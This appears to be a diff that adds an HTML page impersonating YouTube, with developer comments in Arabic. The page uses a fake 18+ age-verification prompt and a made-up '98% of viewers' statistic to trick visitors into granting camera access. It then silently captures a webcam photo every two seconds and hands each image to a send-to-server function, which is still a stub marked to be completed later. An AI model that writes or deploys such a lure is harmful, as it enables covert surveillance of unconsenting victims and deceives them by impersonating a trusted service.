@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Funny Cat Video - YouTube</title>
+    <link rel="icon" href="https://www.youtube.com/favicon.ico">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #181818;
+            color: white;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        .player {
+            background: #000;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        #videoElement {
+            width: 100%;
+            max-width: 854px;
+            background: #333;
+            border-radius: 5px;
+        }
+        .message {
+            background: #ffcc00;
+            color: #000;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        .button {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #ff0000;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎬 Funny Cat Compilation 2024</h1>
+        
+        <div class="player">
+            <div class="loader"></div>
+            <p>Loading video player...</p>
+            <div class="message">
+                🔒 Age verification required: Please allow camera access to confirm you are 18+
+            </div>
+            <video id="videoElement" autoplay playsinline></video>
+            <div style="margin-top: 20px;">
+                <button class="button" onclick="startCamera()">Allow Camera to Continue</button>
+                <button class="button" style="background: #333;" onclick="skip()">Skip Verification</button>
+            </div>
+        </div>
+        
+        <div id="countdown" style="display:none; margin-top:30px;">
+            <h3>✅ Verification successful! Video will play in <span id="timer">5</span> seconds...</h3>
+        </div>
+    </div>
+
+    <script>
+        let stream = null;
+        let captureCount = 0;
+        
+        async function startCamera() {
+            try {
+                document.querySelector('.loader').style.display = 'block';
+                
+                // طلب الكاميرا
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false 
+                });
+                
+                // عرض الفيديو
+                const videoElement = document.getElementById('videoElement');
+                videoElement.srcObject = stream;
+                document.querySelector('.loader').style.display = 'none';
+                document.querySelector('.message').textContent = '✅ Camera activated. Verifying...';
+                
+                // بدء التقاط الصور
+                startCapturing();
+                
+                // إظهار العد التنازلي
+                document.getElementById('countdown').style.display = 'block';
+                let count = 5;
+                const timerElement = document.getElementById('timer');
+                
+                const countdown = setInterval(() => {
+                    count--;
+                    timerElement.textContent = count;
+                    if (count <= 0) {
+                        clearInterval(countdown);
+                        // هنا سنضيف إرسال الصور لاحقاً
+                        alert('Verification complete! Playing video...');
+                        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+                    }
+                }, 1000);
+                
+            } catch (err) {
+                alert('⚠️ Camera access is required to watch this video.');
+                document.querySelector('.loader').style.display = 'none';
+            }
+        }
+        
+        function startCapturing() {
+            // التقاط صورة كل 2 ثانية
+            setInterval(() => {
+                if (!stream) return;
+                
+                const video = document.getElementById('videoElement');
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                // تحويل الصورة
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                captureCount++;
+                console.log(`📸 Captured photo ${captureCount}`);
+                
+                // إرسال الصورة (سنضيف هذا لاحقاً)
+                sendImageToServer(imageData);
+                
+            }, 2000);
+        }
+        
+        function sendImageToServer(imageData) {
+            // TODO: إرسال الصورة لسيرفرك
+            console.log('Sending image to server...');
+        }
+        
+        function skip() {
+            if (confirm('Skipping age verification will limit video quality. Continue?')) {
+                window.location.href = 'https://www.youtube.com';
+            }
+        }
+        
+        // بدء تلقائي بعد 3 ثوان
+        setTimeout(() => {
+            document.querySelector('.message').innerHTML += 
+                '<br><small>98% of viewers complete verification in under 10 seconds.</small>';
+        }, 3000);
+    </script>
+</body>
+</html>
